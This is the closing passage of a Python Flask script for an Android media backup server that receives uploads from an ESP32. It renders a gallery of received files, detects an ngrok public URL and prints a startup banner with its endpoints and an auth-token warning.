    {% for cat, files in groups.items() %}
    <h2>{{ cat }} &mdash; {{ files|length }} files</h2>
    <div class="grid">
      {% for fname in files %}
      {% set ext = fname.rsplit('.',1)[-1].lower() %}
      <div class="card">
        {% if ext in ['jpg','jpeg','png','webp','gif','bmp','tiff','tif'] %}
        <a href="/download/{{ cat }}/{{ fname }}" target="_blank">
          <img src="/download/{{ cat }}/{{ fname }}" alt="{{ fname }}" loading="lazy">
        </a>
        {% elif ext in ['mp4','mov','avi','mkv','3gp','m4v','webm'] %}
        <video controls preload="metadata">
          <source src="/download/{{ cat }}/{{ fname }}">
        </video>
        {% else %}
        <div style="height:140px;display:flex;align-items:center;
                    justify-content:center;font-size:2rem;background:#f0f0f0">📄</div>
        {% endif %}
        <div class="meta" title="{{ fname }}">{{ fname }}</div>
        <a class="dl" href="/download/{{ cat }}/{{ fname }}" download>⬇ Download</a>
      </div>
      {% endfor %}
    </div>
    {% endfor %}
  {% else %}
  <p class="empty">No media received yet. Press GPIO 19 on the ESP32.</p>
  {% endif %}
<script>setTimeout(()=>location.reload(),15000)</script>
</body>
</html>
"""

# ── ngrok URL detection ───────────────────────────────────────────────────────

def get_ngrok_url() -> str:
    try:
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=2) as r:
            data = json.loads(r.read())
        for t in data.get("tunnels", []):
            pub = t.get("public_url", "")
            if pub.startswith("https://"):
                return pub
    except Exception:
        pass
    return ""

# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    public_url = get_ngrok_url()
    _is_windows = sys.platform.startswith("win")

    if not UPLOAD_TOKEN:
        log.warning("UPLOAD_TOKEN is not set — uploads will not be authenticated.")
        if _is_windows:
            log.warning("Set it (cmd):        set UPLOAD_TOKEN=your_secret")
            log.warning("Set it (PowerShell): $env:UPLOAD_TOKEN='your_secret'")
        else:
            log.warning("Set it:  export UPLOAD_TOKEN='your_secret'  then restart.")
        log.warning("Or create a .env file — see .env.example")

    if public_url:
        url_file = _BASE_DIR / "ngrok_url.txt"
        url_file.write_text(public_url + "\n")
        # Print URL to terminal but never print the token
        print(f"\n  ╔══════════════════════════════════════════════════════════╗")
        print(f"  ║     Android Media Backup Server  —  ngrok active         ║")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  Platform    :  {sys.platform}")
        print(f"  ║  Public URL  :  {public_url}")
        print(f"  ║  Health      :  {public_url}/health")
        print(f"  ║  Upload      :  {public_url}/upload        (POST)")
        print(f"  ║  Gallery     :  {public_url}/files")
        print(f"  ║  Report      :  {public_url}/report")
        print(f"  ║  Auth token  :  {'SET' if UPLOAD_TOKEN else 'NOT SET  ← WARNING'}")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  Paste the Public URL into WAN_SERVER_URL in .ino        ║")
        print(f"  ║  URL saved → {url_file}")
        print(f"  ╚══════════════════════════════════════════════════════════╝\n")
    else:
        print("\n  ╔══════════════════════════════════════════════════════════╗")
        print("  ║  [!] ngrok NOT detected on 127.0.0.1:4040                ║")
        print("  ║      Start ngrok FIRST:  ngrok http 8019                 ║")
        print("  ║      Then restart this server.                           ║")
        print("  ╚══════════════════════════════════════════════════════════╝\n")
        print(f"  Starting on port {PORT} (LAN-only without ngrok).\n")

    app.run(host="0.0.0.0", port=PORT, debug=False)
